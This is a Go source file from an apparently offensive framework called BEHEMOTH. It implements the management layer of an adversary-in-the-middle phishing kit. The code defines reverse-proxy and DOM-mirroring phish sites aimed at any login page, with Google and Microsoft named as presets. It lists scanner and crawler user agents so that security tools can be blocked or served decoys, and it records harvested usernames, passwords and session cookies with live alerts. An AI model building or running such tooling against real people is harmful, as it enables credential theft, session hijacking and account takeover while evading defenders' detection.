// Package phish implements a self-contained adversary-in-the-middle (AiTM)
// phishing capability for BEHEMOTH, modeled on the DOMDIFFER kit family
// (Push Security, 2026): reverse-proxy phish sites (Evilginx-style rewriting)
// and DOM mirroring (an attacker-side headless browser relays the genuine
// sign-in page to the victim), plus scanner (bot) filtering and
// credential/session capture. Targets are generic: any HTTP login page works,
// Google/Microsoft are just presets.
//
// Sites and captures persist as JSON/JSONL under <dataDir>/phish, mirroring
// the c2 package's file-backed layout.
package phish

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// Site modes.
const (
	ModeProxy  = "proxy"  // rewrite-and-relay the upstream origin
	ModeMirror = "mirror" // relay the live DOM of an attacker-side browser
)

// Bot (scanner) actions applied to requests that look like security scanners.
const (
	BotNone        = "none"        // no filtering (everything proxied normally)
	BotPassthrough = "passthrough" // serve scanners the genuine upstream page, unmodified
	BotBlock       = "block"       // 404 scanners
	BotDecoy       = "decoy"       // serve a benign decoy page to scanners
)

// DefaultBotUAs lists scanner/headless client markers applied when a site
// enables bot filtering but does not provide its own patterns. Real browsers
// (users) never match these.
var DefaultBotUAs = []string{
	"headless", "phantomjs", "puppeteer", "playwright", "selenium", "bot",
	"crawler", "spider", "slurp", "curl/", "wget", "python-requests",
	"python-urllib", "go-http-client", "java/", "okhttp", "libwww",
	"zgrab", "nuclei", "httpx", "masscan", "whatweb", "scanner",
	"google security exploration", "applebot", "petalbot", "semrush",
	"ahrefs", "moz.com", "screaming frog",
}

// Site is one phishing site definition.
type Site struct {
	ID               string    `json:"id"` // "ph_<hex>"
	Label            string    `json:"label,omitempty"`
	TargetURL        string    `json:"target_url"`                   // scheme://host of the genuine origin
	Mode             string    `json:"mode"`                         // proxy | mirror
	Hosts            []string  `json:"hosts"`                        // phish hostnames this site answers on
	ExtraTargetHosts []string  `json:"extra_target_hosts,omitempty"` // extra upstream hostnames to rewrite
	Capture          bool      `json:"capture"`                      // inject credential-capture beacon (proxy mode)
	BotUA            []string  `json:"bot_ua,omitempty"`             // scanner UA markers (regex, case-insensitive)
	BotIPs           []string  `json:"bot_ips,omitempty"`            // scanner source CIDRs
	BotAction        string    `json:"bot_action"`                   // none | passthrough | block | decoy
	DecoyHTML        string    `json:"decoy_html,omitempty"`
	Enabled          bool      `json:"enabled"`
	CreatedAt        time.Time `json:"created_at"`
}

// SiteInput is the create/update payload for a site.
type SiteInput struct {
	Label            string   `json:"label"`
	TargetURL        string   `json:"target_url"`
	Mode             string   `json:"mode"`
	Hosts            []string `json:"hosts"`
	ExtraTargetHosts []string `json:"extra_target_hosts"`
	Capture          bool     `json:"capture"`
	BotUA            []string `json:"bot_ua"`
	BotIPs           []string `json:"bot_ips"`
	BotAction        string   `json:"bot_action"`
	DecoyHTML        string   `json:"decoy_html"`
}

// Cookie is one harvested session cookie.
type Cookie struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Domain string `json:"domain,omitempty"`
	Path   string `json:"path,omitempty"`
}

// Capture is one harvested credential/session event.
type Capture struct {
	ID        int64             `json:"id"`
	SiteID    string            `json:"site_id"`
	SiteLabel string            `json:"site_label,omitempty"`
	Mode      string            `json:"mode"`
	At        time.Time         `json:"at"`
	URL       string            `json:"url,omitempty"`
	IP        string            `json:"ip,omitempty"`
	UserAgent string            `json:"user_agent,omitempty"`
	Username  string            `json:"username,omitempty"`
	Password  string            `json:"password,omitempty"`
	Fields    map[string]string `json:"fields,omitempty"`
	Cookies   []Cookie          `json:"cookies,omitempty"`
}

// CaptureHook fires synchronously after each recorded capture (wired by the
// server for live notifications); errors are ignored.
type CaptureHook func(Capture)

// Manager owns the phish sites and captures. It is safe for concurrent use.
type Manager struct {
	mu       sync.Mutex
	dir      string
	sites    []*Site
	captures []Capture
	nextCap  int64
	hook     CaptureHook
}

// NewManager loads (or initializes) the file-backed phish store under dir.
func NewManager(dir string) (*Manager, error) {
	m := &Manager{dir: dir, nextCap: 1}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, err
	}
	if raw, err := os.ReadFile(filepath.Join(dir, "sites.json")); err == nil && len(raw) > 0 {
		if err := json.Unmarshal(raw, &m.sites); err != nil {
			return nil, fmt.Errorf("parse sites.json: %w", err)
		}
	}
	if raw, err := os.ReadFile(filepath.Join(dir, "captures.jsonl")); err == nil && len(raw) > 0 {
		for _, line := range strings.Split(strings.TrimSpace(string(raw)), "\n") {
			var c Capture
			if json.Unmarshal([]byte(line), &c) == nil && c.ID > 0 {
				m.captures = append(m.captures, c)
				if c.ID >= m.nextCap {
					m.nextCap = c.ID + 1
				}
			}
		}
	}
	return m, nil
}

// SetCaptureHook installs the post-capture callback.
func (m *Manager) SetCaptureHook(h CaptureHook) {
	m.mu.Lock()
	m.hook = h
	m.mu.Unlock()
}

func newSiteID() string {
	b := make([]byte, 6)
	_, _ = rand.Read(b)
	return "ph_" + hex.EncodeToString(b)
}

// normalizeSiteInput validates/derives the persisted form of a site input.
func normalizeSiteInput(in *SiteInput) error {
	in.Label = strings.TrimSpace(in.Label)
	raw := strings.TrimSpace(in.TargetURL)
	if raw == "" {
		return fmt.Errorf("target_url is required")
	}
	if !strings.Contains(raw, "://") {
		raw = "https://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil || u.Hostname() == "" {
		return fmt.Errorf("target_url invalid: %s", in.TargetURL)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("target_url scheme must be http/https")
	}
	u.Path = strings.TrimSuffix(u.Path, "/")
	in.TargetURL = u.Scheme + "://" + u.Host + u.Path
	in.Mode = strings.TrimSpace(in.Mode)
	if in.Mode == "" {
		in.Mode = ModeProxy
	}
	if in.Mode != ModeProxy && in.Mode != ModeMirror {
		return fmt.Errorf("mode must be proxy or mirror")
	}
	in.BotAction = strings.TrimSpace(strings.ToLower(in.BotAction))
	if in.BotAction == "" {
		in.BotAction = BotNone
	}
	switch in.BotAction {
	case BotNone, BotPassthrough, BotBlock, BotDecoy:
	default:
		return fmt.Errorf("bot_action must be none, passthrough, block or decoy")
	}
	hosts := make([]string, 0, len(in.Hosts))
	seen := map[string]bool{}
	for _, h := range in.Hosts {
		h = strings.ToLower(strings.TrimSpace(h))
		h = strings.TrimPrefix(h, "http://")
		h = strings.TrimPrefix(h, "https://")
		h = strings.TrimSuffix(h, "/")
		if h == "" || seen[h] {
			continue
		}
		seen[h] = true
		hosts = append(hosts, h)
	}
	in.Hosts = hosts
	extra := make([]string, 0, len(in.ExtraTargetHosts))
	seenE := map[string]bool{}
	for _, h := range in.ExtraTargetHosts {
		h = strings.ToLower(strings.TrimSpace(h))
		if h == "" || seenE[h] {
			continue
		}
		seenE[h] = true
		extra = append(extra, h)
	}
	in.ExtraTargetHosts = extra
	if in.BotAction != BotNone && len(in.BotUA) == 0 {
		in.BotUA = DefaultBotUAs
	}
	return nil
}

// hostOwner returns the site id already claiming a phish hostname.
func (m *Manager) hostOwner(host string) string {
	for _, s := range m.sites {
		for _, h := range s.Hosts {
			if h == host {
				return s.ID
			}
		}
	}
	return ""
}

// CreateSite registers a new site.
func (m *Manager) CreateSite(in SiteInput) (*Site, error) {
	if err := normalizeSiteInput(&in); err != nil {
		return nil, err
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	for _, h := range in.Hosts {
		if owner := m.hostOwner(h); owner != "" {
			return nil, fmt.Errorf("phish host %q is already used by site %s", h, owner)
		}
	}
	s := &Site{
		ID: newSiteID(), Label: in.Label, TargetURL: in.TargetURL, Mode: in.Mode,
		Hosts: in.Hosts, ExtraTargetHosts: in.ExtraTargetHosts, Capture: in.Capture,
		BotUA: in.BotUA, BotIPs: in.BotIPs, BotAction: in.BotAction,
		DecoyHTML: in.DecoyHTML, Enabled: true, CreatedAt: time.Now().UTC(),
	}
	m.sites = append(m.sites, s)
	if err := m.saveSitesLocked(); err != nil {
		m.sites = m.sites[:len(m.sites)-1]
		return nil, err
	}
	return s, nil
}

// UpdateSite replaces the editable fields of an existing site.
func (m *Manager) UpdateSite(id string, in SiteInput) (*Site, error) {
	if err := normalizeSiteInput(&in); err != nil {
		return nil, err
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	var site *Site
	for _, s := range m.sites {
		if s.ID == id {
			site = s
			break
		}
	}
	if site == nil {
		return nil, fmt.Errorf("unknown phish site %q", id)
	}
	for _, h := range in.Hosts {
		if owner := m.hostOwner(h); owner != "" && owner != id {
			return nil, fmt.Errorf("phish host %q is already used by site %s", h, owner)
		}
	}
	prev := *site
	site.Label, site.TargetURL, site.Mode = in.Label, in.TargetURL, in.Mode
	site.Hosts, site.ExtraTargetHosts = in.Hosts, in.ExtraTargetHosts
	site.Capture, site.BotUA, site.BotIPs = in.Capture, in.BotUA, in.BotIPs
	site.BotAction, site.DecoyHTML = in.BotAction, in.DecoyHTML
	if err := m.saveSitesLocked(); err != nil {
		*site = prev
		return nil, err
	}
	return site, nil
}

// Enable flips a site's enabled flag.
func (m *Manager) Enable(id string, enabled bool) (*Site, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	for _, s := range m.sites {
		if s.ID == id {
			prev := s.Enabled
			s.Enabled = enabled
			if err := m.saveSitesLocked(); err != nil {
				s.Enabled = prev
				return nil, err
			}
			return s, nil
		}
	}
	return nil, fmt.Errorf("unknown phish site %q", id)
}

// Delete removes a site (captures are kept for the record).
func (m *Manager) Delete(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	kept := m.sites[:0]
	found := false
	for _, s := range m.sites {
		if s.ID == id {
			found = true
			continue
		}
		kept = append(kept, s)
	}
	if !found {
		return fmt.Errorf("unknown phish site %q", id)
	}
	m.sites = kept
	return m.saveSitesLocked()
}

// Get returns one site.
func (m *Manager) Get(id string) (*Site, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	for _, s := range m.sites {
		if s.ID == id {
			cp := *s
			return &cp, true
		}
	}
	return nil, false
}

// List returns all sites (newest first).
func (m *Manager) List() []*Site {
	m.mu.Lock()
	defer m.mu.Unlock()
	out := make([]*Site, 0, len(m.sites))
	for i := len(m.sites) - 1; i >= 0; i-- {
		cp := *m.sites[i]
		out = append(out, &cp)
	}
	return out
}

// ByHost resolves the enabled site answering a phish hostname (Host header
// may carry a port; it is stripped).
func (m *Manager) ByHost(host string) (*Site, bool) {
	host = strings.ToLower(strings.TrimSpace(host))
	if i := strings.LastIndex(host, ":"); i >= 0 && !strings.Contains(host, "]") {
		if _, err := parsePort(host[i+1:]); err == nil {
			host = host[:i]
		}
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	for _, s := range m.sites {
		if !s.Enabled {
			continue
		}
		for _, h := range s.Hosts {
			if h == host {
				cp := *s
				return &cp, true
			}
		}
	}
	return nil, false
}

func parsePort(s string) (int, error) {
	var p int
	if s == "" {
		return 0, fmt.Errorf("bad port")
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return 0, fmt.Errorf("bad port")
		}
		p = p*10 + int(r-'0')
		if p > 65535 {
			return 0, fmt.Errorf("bad port")
		}
	}
	if p == 0 {
		return 0, fmt.Errorf("bad port")
	}
	return p, nil
}

// EnabledCount reports how many sites are currently enabled.
func (m *Manager) EnabledCount() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	n := 0
	for _, s := range m.sites {
		if s.Enabled {
			n++
		}
	}
	return n
}

// RecordCapture stores one capture (assigning the ID) and fires the hook.
func (m *Manager) RecordCapture(c Capture) Capture {
	m.mu.Lock()
	c.ID = m.nextCap
	m.nextCap++
	if c.At.IsZero() {
		c.At = time.Now().UTC()
	}
	for _, s := range m.sites {
		if s.ID == c.SiteID {
			c.SiteLabel = s.Label
			c.Mode = s.Mode
			break
		}
	}
	m.captures = append(m.captures, c)
	if err := m.appendCaptureLocked(c); err != nil {
		m.captures = m.captures[:len(m.captures)-1]
		m.mu.Unlock()
		return c
	}
	hook := m.hook
	m.mu.Unlock()
	if hook != nil {
		hook(c)
	}
	return c
}

// Captures returns the most recent captures, optionally filtered by site.
func (m *Manager) Captures(siteID string, limit int) []Capture {
	if limit <= 0 || limit > 200 {
		limit = 20
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	out := make([]Capture, 0, limit)
	for i := len(m.captures) - 1; i >= 0 && len(out) < limit; i-- {
		if siteID != "" && m.captures[i].SiteID != siteID {
			continue
		}
		out = append(out, m.captures[i])
	}
	return out
}

func (m *Manager) saveSitesLocked() error {
	raw, err := json.MarshalIndent(m.sites, "", "  ")
	if err != nil {
		return err
	}
	return atomicWrite(filepath.Join(m.dir, "sites.json"), raw)
}

func (m *Manager) appendCaptureLocked(c Capture) error {
	f, err := os.OpenFile(filepath.Join(m.dir, "captures.jsonl"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer f.Close()
	line, err := json.Marshal(c)
	if err != nil {
		return err
	}
	_, err = f.Write(append(line, '\n'))
	return err
}

func atomicWrite(path string, raw []byte) error {
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, raw, 0o644); err != nil {
		return err
	}
	return os.Rename(tmp, path)
}

// TargetHost returns the host[:port] of the genuine origin.
func (s *Site) TargetHost() string {
	if u, err := url.Parse(s.TargetURL); err == nil {
		return u.Host
	}
	return ""
}

// upstreamHosts lists every upstream hostname whose references are rewritten
// into phish-host references (the primary target first, then extras).
func (s *Site) upstreamHosts() []string {
	hosts := []string{s.TargetHost()}
	return append(hosts, s.ExtraTargetHosts...)
}
